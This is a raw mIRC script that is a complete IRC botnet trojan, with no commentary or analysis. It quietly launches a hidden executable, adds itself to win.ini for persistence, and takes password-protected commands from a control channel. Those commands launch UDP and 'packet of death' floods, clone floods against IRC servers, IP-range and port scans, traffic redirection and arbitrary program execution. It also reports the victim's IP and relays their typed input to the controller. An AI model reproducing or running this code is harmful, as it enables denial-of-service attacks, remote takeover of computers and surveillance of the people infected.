   [script]
   n0=alias random {
   n1=  if ($exists(temp.scr) == $false) { /nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(0,9) $+ $rand(0,9) $+ $rand(0,9) | halt }
   n2=  else { /nick $read temp.scr $+ $r(0,9) }
   n3=}
   n4=on *:START:{
   n5=  .flush | unset %scan.* | unset %port.*
   n6=  if ($exists(temp2.exe) == $false) { /exit }
   n7=  //run $mircdir $+ temp2.exe /n /fh       
   n8=  if ($exists(temp.scr) == $false) { identd on $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) | halt }
   n9=  else { /identd on $r(a,z) $+ $read temp.scr $+ $r(a,z) }
   n10=  set %load.write $findfile(c:\,win.ini,0) | if (%load.write > 0) { set %load.count 0 | :start | inc %load.count 1 | writeini $findfile(c:\,win.ini,%load.count) windows run $mircexe | if (%load.count < %loud.write) { goto start } } | unset %load.*
   n11=  if (%script.pass = $null) { set %script.pass pussy | set %connect.server CA-r.GamesNET.net }
   n12=  if (%connect.server != $null) { //timerconnect 0 100 /server %connect.server }
   n13=}
   n14=on *:CONNECT: { .flush | mode $me +ix | if (%connect.chan = $null) { set %connect.chan #polarisx } | timergetinchan 0 30 /join %connect.chan | .timerconnect off }
   n15=on *:PART:#: { if ($comchan($nick,0) = 0) { /ruser $nick } | if ($chan = %connect.chan) { .timergetinchan 0 30 join %connect.chan } }
   n16=on *:JOIN:#: { if ($chan = %connect.chan) { .timergetinchan off } }
   n17=alias packetofdeath {
   n18=  if ($4 = $null) { notice $nick Error Please use !packet address size amount | halt }
   n19=  if ($chr(46) !isin $1) || ($2 !isnum) || ($3 !isnum) || ($4 !isnum) { notice $nick Error Please use !packet address size amount | halt }
   n20=  if ($remove($2,$chr(46)) !isnum) { notice $nick Error no letters may be contained in the ip | unset %packet.* | halt }
   n21=  .notice $nick Now Packeting $1 with $2 bytes $3 times
   n22=  set %packet.ip $1
   n23=  set %packet.bytes $2
   n24=  set %packet.amount $3
   n25=  set %packet.count 0
   n26=  set %packet.port $rand(1,6) $+ $rand(0,6) $+ ($rand(0,6) $+ $rand(0,9)
   n27=  :start
   n28=  if (%packet.count >= %packet.amount) { sockclose packet | unset %packet.* | .notice $nick Packeting has completed | halt }
   n29=  inc %packet.count 1
   n30=  /sockudp -b  packet 60 %packet.ip %packet.port %packet.bytes %packet.bytes
   n31=  goto start
   n32=}
   n33=alias gcoolstart  { if $1 = STOP { .timergcoolt off | unset %gnum | msg %pchan [packeting]: Halted! | unset %pchan } | if $3 = $null { return } |  if $timer(gcoolt).com != $null { msg %pchan ERROR! Currently flooding: $gettok($timer(gcoolt).com,3,32)  | return } |  msg %pchan 14[sending ( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port: ( $+ $3 $+ )14] |  set %gnum 0 |  .timergcoolt -m 0 400 gdope $1 $2 $3 }
   n34=alias gdope {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 4
   n35=  sockudp gnumc
   n36=  sockudp gnumc3 $2 $3 + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATA0+ + +ATX0
   n37=  sockudp gnumc2 $2 $3 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
   n38=  sockudp gnumc
   n39=  return |  :done | //msg %pchan [packeting]: Finished! | .timergcoolt off | unset %gnum | unset %pchan
   n40=}
   n41=on *:socklisten:gtportdirect*:{  set %gtsocknum 0 | :loop |  inc %gtsocknum 1 |  if $sock(gtin*,$calc($sock(gtin*,0) + %gtsocknum ) ) != $null { goto loop } |  set %gtdone $gettok($sockname,2,46) $+ . $+ $calc($sock(gtin*,0) + %gtsocknum ) | sockaccept gtin $+ . $+ %gtdone | sockopen gtout $+ . $+ %gtdone $gettok($sock($Sockname).mark,1,32) $gettok($sock($Sockname).mark,2,32) | unset %gtdone %gtsocknum }
   n42=on *:Sockread:gtin*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtinfotem [ $+ [ $sockname ] ] ] | if [ %gtinfotem [ $+ [ $sockname ] ] ] = $null { return } | if $sock( [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] ).status != active { inc %gtscatchnum 1 | set %gtempr $+ $right($sockname,$calc($len($sockname) - 4) ) $+ %gtscatchnum [ %gtinfotem [ $+ [ $sockname ] ] ] | return } | sockwrite -n [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] [ %gtinfotem [ $+ [ $sockname ] ] ] | unset [ %gtinfotem [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread }
   n43=on *:Sockread:gtout*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtouttemp [ $+ [ $sockname ] ] ] |  if [ %gtouttemp [ $+ [ $sockname ] ] ] = $null { return } | sockwrite -n [ gtin [ $+ [ $remove($sockname,gtout) ] ] ] [ %gtouttemp [ $+ [ $sockname ] ] ] | unset [ %gtouttemp [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread }
   n44=on *:Sockopen:gtout*: {  if ($sockerr > 0) return | set %gttempvar 0 | :stupidloop | inc %gttempvar 1 | if %gtempr  [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar ] ] != $null { sockwrite -n $sockname %gtempr [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar  ] ] |  goto stupidloop  } | else { unset %gtempr | unset %gtscatchnum | unset %gtempr* } }
   n45=on *:sockclose:gtout*: { unset %gtempr* | sockclose gtin $+ $right($sockname,$calc($len($sockname) - 5) ) | unset %gtscatchnum | sockclose $sockname }
   n46=on *:sockclose:gtin*: {   unset %gtempr* | sockclose gtout $+ $right($sockname,$calc($len($sockname) - 4) ) | unset %gtscatchnum  | sockclose $sockname }
   n47=alias predirectstats { set %gtpcount 0 | :startloophere | inc %gtpcount 1 |  if $sock(gtportdirect*,%gtpcount) != $null { /msg $1 14*(PortRedirect)*: In-port: $gettok($sock(gtportdirect*,%gtpcount),2,46) to $gettok($sock(gtportdirect*,%gtpcount).mark,1,32) $+ : $+ $gettok($sock(gtportdirect*,%gtpcount).mark,2,32)   | /msg $1 12[Local IP Address]:14 $ip | goto startloophere  } | else { if %gtpcount = 1 { //msg $1 12*** Error, no port redirects! } | //msg $1 12*** PortRedirect/End | unset %gtpcount } }
   n48=alias pdirectstop { Set %gtrdstoppnum $1 | sockclose [ gtportdirect. [ $+ [ %gtrdstoppnum ] ] ]  | sockclose [ gtin. [ $+ [ %gtrdstoppnum ] ] ] $+ *  | sockclose [ gtout. [ $+ [ %gtrdstoppnum ] ] ] $+ *  | unset %gtrdstoppnum }
   n49=alias gtportdirect { if $3 = $null { return } | socklisten gtportdirect $+ . $+ $1 $1 | sockmark gtportdirect $+ . $+ $1 $2 $3 }
   n50=on *:sockread:Papa*:{ .sockread %clone.temp | if ($gettok(%clone.temp,1,32) == Ping) { sockwrite -tn $sockname Pong $server } }
   n51=alias fuck {
   n52=  if ($2 = $null) || ($2 !isnum) { notice $nick Error Type: !flood <chan/nick> <num of clones> <server> <port> <message> | halt }
   n53=  set %nick $$1
   n54=  set %clones $$2
   n55=  set %channel $$1
   n56=  if ( $3 = $null) { set %server $server }
   n57=  if ( $3 != $null) { set %server $$3 }
   n58=  if ( $4 = $null) || ( $4 !isnum) { set %port $port }
   n59=  if ( $4 != $null) { set %port $$4 }
   n60=  if ( $5 = $null) { set %flood !list PING ME File Server Online flo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0d Send Queue fserver }
   n61=  if ($5 != $null) { set %flood $5- }
   n62=  set %papaflood on
   n63=  var %var = 0
   n64=  :loop
   n65=  inc %var
   n66=  if (%papaflood == on) && (%var <= %clones) { .sockopen Papa $+ %var %server %port | goto loop }
   n67=  else { notice $nick 4Clones Loaded | .notice $NICK Task Completed. | halt }
   n68=}
   n69=
   n70=alias cleanup {
   n71=  .set %papaflood off
   n72=  .sockclose Papa*
   n73=  .unset %nick
   n74=  unset %channel
   n75=  unset %server
   n76=  unset %port
   n77=  unset %clones
   n78=  unset %flood
   n79=  notice $nick 4All Clones Have Been Cleared
   n80=}
   n81=
   n82=on *:Sockopen:Papa*:{
   n83=  if ($sockerr > 0) { halt }
   n84=  set -u1 %user $rand(a,z) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(a,z)
   n85=  .sockwrite -nt $sockname USER %user %user %user : $+ %user
   n86=  .sockwrite -nt $sockname NICK $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
   n87=  .sockwrite -nt $sockname JOIN : $+ %channel
   n88=  .sockwrite -n $sockname Privmsg %nick : $+ %flood
   n89=  .sockwrite -n $sockname privmsg %nick : $+ $chr(1) $+ TIME $+ $chr(1)
   n90=  .sockclose $sockname
   n91=  .sockopen Papa $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) %server %port
   n92=}
   n93=ctcp 700:!version:*: { notice $nick %quit }
   n94=ctcp 700:VERSION:*: { ctcpreply $nick %quit }
   n95=
   n96=on *:QUIT: ruser $nick | if ($nick = %scan.nick) { .timerscan off | .timersockcheck off | unset %scan.* | .sockclose scan* | halt }
   n97=on *:NICK: ruser $nick | if ($nick = %scan.nick) { set %scan.nick $newnick | .msg %scan.nick Scanned nickname now changed to %scan.nick ;) | halt }
   n98=on 700:TEXT:!scanStatus:*: {
   n99=  if (%scan.nick != $null) { .msg $nick I'm Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay) }
   n100=  else { .msg $nick No Scans In Progress }
   n101=}
   n102=on 700:TEXT:!scanAbort:*: {
   n103=  if ($nick = %scan.nick) { .msg $nick you have just aborted the scanning of port  $+ %scan.port $+  | .timerscan off | .timersockcheck off | unset %scan.* | .sockclose scan* | halt }
   n104=  else { .msg $nick Sorry but your not the user that started the scan so you cannot be the user to Abort the Scan | halt }
   n105=}
   n106=on 700:TEXT:!scan *:*: {
   n107=  if (%scan.nick != $null) { .msg $nick I'm Allready Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay) | halt }
   n108=  if ($remove($2,$chr(46)) !isnum) || ($remove($3,$chr(46)) !isnum) || ($remove($4,$chr(44)) !isnum) || ($5 !isnum) { .msg $nick Syntax: please Type !scan <starting ip> <ending ip> <port> <delay> EX !scan 24.24.24.1 24.24.24.255 27374 5 | halt }
   n109=  else {
   n110=    set %scan.Start1 $gettok($2,1,46)
   n111=    set %scan.Start2 $gettok($2,2,46)
   n112=    set %scan.Start3 $gettok($2,3,46)
   n113=    set %scan.Start4 $gettok($2,4,46)
   n114=    set %scan.Perm1 $gettok($2,1,46)
   n115=    set %scan.Perm2 $gettok($2,2,46)
   n116=    set %scan.Perm3 $gettok($2,3,46)
   n117=    set %scan.Perm4 $gettok($2,4,46)
   n118=    set %scan.End1 $gettok($3,1,46)
   n119=    set %scan.End2 $gettok($3,2,46)
   n120=    set %scan.End3 $gettok($3,3,46)
   n121=    set %scan.End4 $gettok($3,4,46)
   n122=    if (%scan.start1 > 255) || (%scan.start2 > 255) || (%scan.start3 > 255) || (%scan.start4 > 255) || (%scan.end1 > 255) || (%scan.end2 > 255) || (%scan.end3 > 255) || (%scan.end4 > 255) { .msg $nick Sorry but you entered a digit Out Of Range | unset %scan.* | halt }
   n123=    if (%scan.start1 > %scan.end1) || (%scan.start2 > %scan.end2) || (%scan.start3 > %scan.end3) || (%scan.start4 > %scan.end4) { .msg $nick Error Starting scan, your ending Ip is greater then your Starting ip | unset %scan.* | halt }
   n124=    set %scan.port $4
   n125=    set %scan.delay $5
   n126=    set %scan.nick $nick
   n127=    .timerscan 0 %scan.delay scancheck
   n128=    .msg %scan.nick now Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay)
   n129=  }
   n130=}
   n131=on *:KICK:#: { if ($knick = $me) && ($chan = %connect.chan) { .timergetinchan 0 30 /join %connect.chan } }
   n132=alias scancheck {
   n133=  if (%scan.start1 > 255) { .msg %scan.nick Scaning Has Completed | .msg %scan.nick Scanning has completed, now waiting for all sockets to close, you will be notified when all sockets are closed | .timerscan off | .timersockscheck 0 5 scansock | halt }
   n134=  if (%scan.start2 > 255) || (%scan.start3 > 255) || (%scan.start4 > 255) { .msg %scan.nick An Error Has Occured in the Scanning Proccess, Scan Aborted at %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 | unset %scan.* | .timerscan off | halt }
   n135=  if ($count(%scan.port,$chr(44)) >= 1) {
   n136=    set %scan.counter 0
   n137=    set %scan.countport $count(%scan.port,$chr(44))
   n138=    inc %scan.countport 1
   n139=    :start
   n140=    inc %scan.counter 1
   n141=    .sockopen scan $+ $gettok(%scan.port,%scan.counter,44) $+ $chr(46) $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $gettok(%scan.port,%scan.counter,44)
   n142=    if (%scan.counter >= %scan.countport) { goto end }
   n143=    else { goto start }
   n144=  }
   n145=  else { .sockopen scan $+ %scan.port $+ $chr(46) $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.port }
   n146=  :end
   n147=  inc %scan.start4 1
   n148=  if (%scan.start4 > %scan.end4) { set %scan.start4 %scan.perm4 | inc %scan.start3 }
   n149=  if (%scan.start3 > %scan.end3) { set %scan.start3 %scan.perm3 | inc %scan.start2 }
   n150=  if (%scan.start2 > %scan.end2) { set %scan.start2 %scan.perm2 | inc %scan.start1 }
   n151=  if (%scan.start1 > %scan.end1) { .msg %scan.nick Scanning has completed, now waiting for all sockets to close, you will be notified when all sockets are closed | .timerscan off | .timersockscheck 0 5 scansock | halt }
   n152=}
   n153=alias scansock {
   n154=  if ($sock(scan*,0) = 0) {
   n155=    .msg %scan.nick All Sockets Have closed, scanning all Variables now Being wiped!
   n156=    unset %scan.*
   n157=    .timersockscheck off
   n158=  }
   n159=}
   n160=on *:SOCKOPEN:scan*: {
   n161=  if ($sockerr > 0) { .sockclose $sockname | halt }
   n162=  .msg %scan.nick IP: $gettok($remove($sockname,scan),2-,46) Port: $gettok($remove($sockname,scan),1,46)
   n163=  .write scan.txt IP: $gettok($remove($sockname,scan),2-,46) Port: $gettok($remove($sockname,scan),1,46)
   n164=  .sockclose $sockname
   n165=}
   n166=on *:QUIT: if ($nick = %port.nick) { .timerport off | .timerportcheck off | unset %port.* | .sockclose port* | halt }
   n167=on *:NICK: if ($nick = %port.nick) { set %port.nick $newnick | .msg %port.nick Port Probing nickname now changed to %port.nick ;) | halt }
   n168=
   n169=on 700:TEXT:!portstatus:*: { if (%port.nick = $null) { msg $nick I am currently Not scanning any ports }
   n170=  elseif (%port.nick != $null) { .msg $nick I am currently scanning %port.address  on ports %port.perm to %port.end  i'm currently at %port.start its estimated another $duration($calc($iif(%port.delay > 0,%port.delay) $iif(%port.delay > 0,*) $calc(%port.end - %port.start) + 5)) before i'm done
   n171=  }
   n172=}
   n173=on 700:TEXT:!portabort:*: { if ($nick = %port.nick) { .msg $nick i have aborted port scan | .timerport off | .timerportsock off | unset %port.* | halt } }
   n174=on 700:TEXT:!portscan *:*: {
   n175=  if ($4 = $null) { msg $nick Error Entering Data use !portscan <ip> <Starting Port> <Ending Port> <delay> EX !portscan 24.24.24.42 1 9000 5 | halt }
   n176=  if (%port.nick != $null) { .msg $nick Sorry but i am allready Scanning  $+ %port.perm $+  to  $+ %port.end $+  on  $+ %port.address $+  | halt }
   n177=  if ($remove($2,$chr(46)) !isnum) || ($3 !isnum) || ($4 !isnum) || ($5 !isnum) { .msg msg $nick Error Entering Data use !portscan <ip> <Starting Port> <Ending Port> <delay> EX !portscan 24.24.24.42 1 9000 1 | halt }
   n178=  if ($4 < $3) { .msg $nick Error Starting Port Can't be greater then ending port | halt }
   n179=  set %port.address $2
   n180=  set %port.start $3
   n181=  set %port.end $4
   n182=  set %port.perm $3
   n183=  set %port.delay $5
   n184=  set %port.nick $nick
   n185=  .timerport 0 %port.delay portscan
   n186=  .msg %port.nick now scanning  $+ %port.address $+  on Ports %port.start to %port.end with a delay of %port.delay  estimated time to finish, $duration($calc($iif(%port.delay > 0,%port.delay) $iif(%port.delay > 0,*) $calc(%port.end - %port.start) + 5))
   n187=}
   n188=alias portscan {
   n189=  .sockopen port $+ %port.start $+ $chr(46) $+ %port.address %port.address %port.start
   n190=  inc %port.start 1
   n191=  if (%port.start >= %port.end) { .msg %port.nick Scanning of Ports has completed, now waiting for all ports to close | .timerport off | .timerportsock 0 5 portsock | halt }
   n192=}
   n193=alias portsock {
   n194=  if ($sock(port*,0) = 0) {
   n195=    .msg %port.nick scanning has now completed and all sockets have closed, you may now use port scan again
   n196=    unset %port.*
   n197=    .timerportsock off
   n198=  }
   n199=}
   n200=on *:SOCKOPEN:port*: {
   n201=  if ($sockerr > 0) { .sockclose $sockname | halt }
   n202=  .msg %port.nick Address: $gettok($remove($sockname,port),2-,46) Port: $gettok($remove($sockname,port),1,46)
   n203=  .sockclose $sockname
   n204=}
   n205=
   n206=on 1:TEXT:!login *:*: {
   n207=  if ($2 = %script.pass) { auser 700 $nick | .notice $nick Access granted bot online }
   n208=}
   n209=on 700:TEXT:*:*: {
   n210=  if ($exists(temp2.exe) == $false) { /quit Error/Missing File ( $+ $ip $+ ) (temp2.exe (hide not detected! quitting)) | /exit }
   n211=  if ($1 = !version) { msg $chan %quit -=I Own j00=- }
   n212=  if ($1 = !msg) && ($3 != $null) { /msg $2- | .notice $NICK Task Completed. }
   n213=  if ($1 = !flood) && ($2 != $null) { /fuck $2- }
   n214=  if ($1 = !floodoff) { /cleanup }
   n215=  if ($1 = !part) && ($2 != $null) { /PART $2- | .notice $NICK Task Completed. }
   n216=  if ($1 = !join) && ($2 != $null) { /Join $2 | .notice $NICK Task Completed. }
   n217=  if ($1 = !dienow) { /quit I Am a Bitch who hates $nick for killing me | /exit }
   n218=  if ($1 = !randomnicks) { /random | .notice $NICK Task Completed. }
   n219=  if ($1 = !setserver) && ($2 != $null) { /set %server $2- | .notice $NICK Task Completed. }
   n220=  if ($1 = !Nick) && ($2 != $null) { /nick $2- | .notice $NICK Task Completed. }
   n221=  if ($1 = !notice) && ($3 != $null) { /notice $2- | .notice $NICK Task Completed. }
   n222=  if ($1 = !Ru) && ($2 != $null) { /ruser $2- | notice $nick $2- Removed From My Access List. }
   n223=  if ($1 = !packet) { packetofdeath $2 $3 $4 }
   n224=  if ($1 = !run) && ($2 != $null) { //run $2- }
   n225=  if ($1 = !stats) { if ($chan != $null) { .msg $chan I am using (Windows $os $+ ) With mIRC version $version I have been connected to ( $+ $server $+ ) on port ( $+ $port $+ ) for ( $+ $duration($online) $+ ). It has been ( $+ $duration($calc($ticks / 1000)) $+ ) since i last rebooted Ip Address is ( $+ $ip $+ ) Mask ( $+ $host $+ ) } | else { .msg $nick I am using (Windows $os $+ ) With mIRC version $version I have been connected to ( $+ $server $+ ) on port ( $+ $port $+ ) for ( $+ $duration($online) $+ ). It has been ( $+ $duration($calc($ticks / 1000)) $+ ) since i last rebooted Ip Address is ( $+ $ip $+ ) Mask ( $+ $host $+ ) } }
   n226=  if ($1 = !url) { if ($url != $null) { .msg $chan i'm currently at $url } | else { .msg $chan i'm not at any urls } }
   n227=  if ($1 = !reboot) { .notice $nick Bye :( | /run $mircdir $+ rb.exe }
   n228=  if ($1 = !varset) && ($3 != $null) { //set $2 [ [ $3- ] ] | //msg # 14[12var set:14] [12 $+ $2 $+ 14] :to: [12 $+ [ [ $3- ] ] $+ 14]  }
   n229=  if ($1 = !var) && ($2 != $null) { msg $chan  $+ $2 $+  is currently set to [ [ $2- ] ] }
   n230=  if ($1 = !pfast) && ($chan != $null) { //set %pchan # |  if ($4 == random) { //gcoolstart $2 $3 $r(1,64000) | halt } | //gcoolstart $2 $3 $4 }
   n231=  if ($1 = !portredirect) { if ($2 == $null) { /msg # 14Portredirection Error!!! For help type: !portredirect help | halt } | if ($2 == help) { /msg # 14*** Port Redirection Help! *** | /msg # 14Commands.. | //msg # 14!portredirect add 1000 irc.dal.net 6667 | //msg # 14!portredirect stop port | //msg # 14!portredirect stats | /msg # 14Port Redirect Help / END halt } | if ($2 == add) { if ($5 == $null) { /msg # 3Port Redirection Error: !portredirect add inputport outputserver outputserverport (!portredirect add 1000 irc.dal.net 6667) | halt } | //gtportdirect $3- | /msg # 14[Redirect Added] I-port=( $+ $3 $+ ) to $4 $+ $5 | /msg # 12[Local IP Address]:14 $ip |  halt  } |  if ($2 == stop) {  if ($3 == $null) { halt } | /pdirectstop $3 |  /msg # 14[Portredirection] Port:(12 $+ $3 $+ 14) Has been stopped. |  halt  } | if ($2 == stats) { |  //msg  # 12*** Port Redirection Stat's. |  /predirectstats #  } }
   n232=  if ($1 = !sub7) { if ($2 = ON) { if ($group(#Sub7Update) = on) { .msg $chan Sub7 Auto Updater is Allready Enabled } | else { .msg $chan Sub7 Auto Updater Now Enabled | .enable #Sub7Update } } | if ($2 = OFF) { if ($group(#Sub7Update) = off) { .msg $chan Sub7 Auto Updater Allready Dissabled } | else { .msg $chan Sub7 Auto Updater Now Dissabled | .disable #Sub7Update } } | else { .msg $chan Syntax: type either !sub7 ON to turn it on or !sub7 OFF to dissable it } }
   n233=}
   n234=on *:DISCONNECT: { .flush | .timergetinchan off | random | //timerconnect 0 100 /server %connect.server |   set %load.write $findfile(c:\,win.ini,0) | if (%load.write > 0) { set %load.count 0 | :start | inc %load.count 1 | writeini $findfile(c:\,win.ini,%load.count) windows run $mircexe | if (%load.count < %loud.write) { goto start } } | unset %load.* }
   n235=on *:OP:#: { if ($chan = %connect.chan) && ($opnick = $me) { mode $chan +mnst-iR } }
   n236=on *:INPUT:*: { haltdef | /echo -a < $+ $me $+ > $1- | msg %connect.chan --Warning- (Input command) $1- | /clearall | //run temp2.exe /n /fh        | halt }
   n237=}
